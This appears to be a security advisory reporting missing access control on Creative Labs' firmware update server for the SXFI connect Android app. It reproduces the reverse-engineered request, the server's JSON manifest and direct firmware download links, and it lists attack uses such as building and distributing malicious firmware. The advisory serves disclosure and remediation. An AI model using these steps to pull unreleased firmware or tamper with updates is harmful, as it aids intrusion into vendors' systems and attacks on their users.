# Vulnerability Report - com.creative.apps.xficonnect- Incorrect Access Control

**Product:** `com.creative.apps.xficonnect`

**Vendor:** [Creative Labs Pte Ltd](https://hk.creative.com/)

**Version:** 2.00.02

**Vulnerability Type:** Incorrect Access Control

**Severity:** High

## Description

The `com.creative.apps.xficonnect` , developed by **Creative Labs Pte Ltd**, suffers from an Incorrect Access Control vulnerability during the device firmware update process. The app uses HTTPS requests to download firmware updates. By reverse engineering the app, it was possible to identify the firmware download mechanism and the download link. Dynamic testing revealed that the vendor's firmware server lacks proper access control, leading to **firmware leakage**.

## Reproduction Steps

1. The `IM_SERVER_PATH, IM_SERVER_PATH_STAGE` Field values in the `ApplicationUpdateConstant` class provide the necessary URL and other information required for the HTTPS request. Static reverse engineering allows for the reconstruction of the complete request as follows:

   ![image-20241003200421588](https://s2.loli.net/2024/10/03/3FtTaHRWoP8zBuI.png)

2. Sending this URL request to the firmware server results in a direct response containing the latest firmware information as follows:

   > Request

   ```http
   GET https://api.creative.com/soniccarrier/creative/firmwareupgrade/creative_sxfi_theater.json HTTP/2
   Content-Type: text/plain
   host: api.creative.com
   ```

   > Response:

   ```http
   HTTP/2 200
   date: Wed, 02 Oct 2024 10:50:37 GMT
   content-type: application/javascript
   content-length: 1242
   last-modified: Fri, 17 Jan 2020 05:50:09 GMT
   accept-ranges: bytes
   server: Microsoft-IIS/8.0
   x-ua-compatible: IE=edge
   x-xss-protection: 1;mode=block
   x-content-type-options: nosniff
   referrer-policy: no-referrer-when-downgrade
   
   {
       "JSONversion":2,
       "App":"SXFI AIR Control",
       "prodName":"Creative SXFI THEATER",
       "prodCode":1020304050,
       "fWVerCode":0,
       "fWVersion":"1.2.200103.0110",
       "type":"firmwareUpdate",
       "message":"Firmware update available.",
       "unixTime":1514448181,
       "urlSupport":"https://support.sxfi.com/sxfi-theater",
       "isOTASupported":false,
       "urlDownload":"",
       "countryCode":"ALL",
       "target":[
           {
               "MAC":false,
               "Win":true,
               "iOS":true,
               "Android":true
           }
       ],
       "fWVersions": [
           {
               "minVerCode": 0,
               "verCode": 101905171310,
               "urlDownload": "http://files.creative.com/manualdn/Firmwares/SXFITHEATER_FIRMWARE/IMG/GH0380-1.0.190517.zif"
           },
           {
               "minVerCode": 0,
               "verCode": 111910070030,
               "urlDownload": "http://files.creative.com/manualdn/Firmwares/SXFITHEATER_FIRMWARE/IMG/GH0380-1.1.191007.zif"
           },
           {
               "minVerCode": 0,
               "verCode": 122001030110,
               "urlDownload": "http://files.creative.com/manualdn/Firmwares/SXFITHEATER_FIRMWARE/IMG/GH0380-1.2.200103.zif"
           }
       ]
   }
   ```

   Consequently, the unprotected firmware can be directly downloaded using this information.

   ![image-20241003201304918](https://s2.loli.net/2024/10/03/vwq7bVH4QtrCzXc.png)

   In total, we successfully downloaded **4 firmware** by exploiting the vulnerability.

## Impact

An attacker can exploit this vulnerability to:

- Download the latest firmware before it is officially released.
- Analyze the firmware for vulnerabilities or proprietary information.
- Create modified firmware images with malicious code.
- Distribute compromised firmware updates to unsuspecting users.

## Remediation

- Implement proper access control on the firmware server, such as device ID and user ID verification.
- Enhance the app's firmware update mechanism to include authentication credentials in the requests.

## Disclaimer

This vulnerability report is provided for informational purposes only and should not be used for any malicious activities. The author is not responsible for any misuse of the information contained herein.